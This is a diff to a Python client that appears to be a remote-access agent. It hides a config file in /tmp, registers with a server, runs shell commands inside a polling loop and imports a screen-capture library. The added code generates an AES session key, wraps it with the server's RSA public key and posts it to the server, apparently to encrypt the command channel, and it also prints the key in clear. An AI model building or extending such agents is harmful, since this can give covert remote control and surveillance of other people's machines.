@@ -5,7 +5,12 @@ import platform
 import os
 import json
 import mss
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_OAEP
+from Crypto.Random import get_random_bytes
 
+# Track the current working directory (starting with the root or default directory)
+current_directory = os.path.expanduser("~")
 SERVER_URL = "https://localhost:5000"  # Change to your actual server URL later
 
 CONFIG_FILE_LINUX = "/tmp/.rootconfig.ini"  # Path in Linux root directory
@@ -122,9 +127,98 @@ def register_client():
     except Exception as e:
         print(f"Error during registration: {e}")
         return None
+    
+# Start the check-and-register process
+client_id = check_and_register_client()
 
-# Track the current working directory (starting with the root or default directory)
-current_directory = os.path.expanduser("~")
+if client_id:
+    print(f"Client registered with ID: {client_id}")
+else:
+    print("Client registration failed.")
+
+def aes_session_key_function(client_id, SERVER_URL, cert_path="cert.pem"):
+    """
+    Generate an AES session key, prepare a payload with client_id and AES key,
+    encrypt the entire payload with the server's RSA public key, and send it to
+    the /api/aes-share endpoint.
+    
+    Args:
+        client_id (str): The client's unique ID from registration.
+        SERVER_URL (str): The base URL of the server (default: https://localhost:5000).
+        cert_path (str): Path to the server's SSL certificate for verification (default: cert.pem).
+    
+    Returns:
+        bytes: The generated AES key if successful, None if failed.
+    """
+    try:
+        # Step 1: Load the server's RSA public key from the config file
+        config_file = CONFIG_FILE_LINUX if platform.system() == "Linux" else CONFIG_FILE_WINDOWS
+        print(f"Loading config file from: {config_file}")
+        with open(config_file, 'r') as file:
+            config_data = json.load(file)
+            server_public_key_pem = config_data.get("public_key")
+        
+        if not server_public_key_pem:
+            print("Error: Server public key not found in config file.")
+            return None
+        
+        # Step 2: Import the RSA public key
+        print("Importing server's RSA public key")
+        server_public_key = RSA.import_key(server_public_key_pem)
+        
+        # Step 3: Generate a 256-bit AES session key
+        print("Generating 256-bit AES session key")
+        aes_key = get_random_bytes(32)  # 32 bytes = 256 bits
+        
+        # Step 4: Prepare the JSON payload
+        payload = {
+            "client_id": client_id,
+            "aes_key": aes_key.hex()  # Store AES key as hex in payload
+        }
+        payload_json = json.dumps(payload)  # Serialize to JSON string
+        payload_bytes = payload_json.encode('utf-8')  # Convert to bytes
+        print(f"Prepared payload (JSON): {payload_json}")
+        print(f"Payload size: {len(payload_bytes)} bytes")
+
+        # Step 5: Check RSA encryption size limit
+        rsa_key_size = server_public_key.size_in_bytes()  # e.g., 256 bytes for 2048-bit key
+        max_data_size = rsa_key_size - 42  # OAEP padding overhead (approx 42 bytes)
+        if len(payload_bytes) > max_data_size:
+            print(f"Error: Payload size ({len(payload_bytes)} bytes) exceeds RSA limit ({max_data_size} bytes)")
+            return None
+
+        # Step 6: Encrypt the entire payload with the server's RSA public key
+        print("Encrypting entire payload with RSA public key")
+        cipher_rsa = PKCS1_OAEP.new(server_public_key)
+        encrypted_payload = cipher_rsa.encrypt(payload_bytes)
+        print(f"Encrypted payload (first 10 bytes): {encrypted_payload[:10].hex()}...")
+
+        # Step 7: Send the encrypted payload to the /api/aes-share endpoint
+        endpoint = f"{SERVER_URL}/api/aes-share"
+        print(f"Sending POST request to {endpoint}")
+        response = requests.post(
+            endpoint,
+            json={"encrypted_payload": encrypted_payload.hex()},  # Send as hex string
+            verify=cert_path,
+            timeout=5
+        )
+        
+        # Step 8: Check the response
+        if response.status_code == 200:
+            print("Encrypted payload successfully shared with server")
+            return aes_key  # Return the AES key for local use
+        else:
+            print(f"Failed to share encrypted payload. Status code: {response.status_code}, Response: {response.text}")
+            return None
+            
+    except Exception as e:
+        print(f"Error in aes_session_key_function: {e}")
+        return None
+
+# Example usage (after registration):
+aes_key = aes_session_key_function(client_id,SERVER_URL)
+if aes_key:
+    print(f"AES session key generated and shared: {aes_key.hex()}")
 
 def execute_command(command):
     """Execute the shell command, update current directory if 'cd' command is issued."""
@@ -152,13 +246,6 @@ def execute_command(command):
     except subprocess.CalledProcessError as e:
         return f"Error: {e.output}"
 
-# Start the check-and-register process
-client_id = check_and_register_client()
-
-if client_id:
-    print(f"Client registered with ID: {client_id}")
-else:
-    print("Client registration failed.")
 
 while True:
     try:
